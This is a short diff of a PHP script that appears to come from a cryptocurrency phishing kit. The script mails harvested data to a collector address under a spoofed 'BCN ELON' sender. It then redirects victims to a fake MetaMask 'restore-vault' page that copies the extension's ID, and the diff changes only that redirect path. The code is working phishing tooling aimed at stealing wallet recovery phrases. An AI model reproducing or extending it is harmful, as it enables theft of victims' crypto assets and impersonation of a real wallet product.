@@ -35,7 +35,7 @@ $headers = "From: BCN ELON </>";
 mail($rezult_mail, $subject, $message, $headers);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-top.location=\"/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
+top.location=\"prize/metamask/invalid.html?/nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault\";
 // -->
 </script>";
 ?>
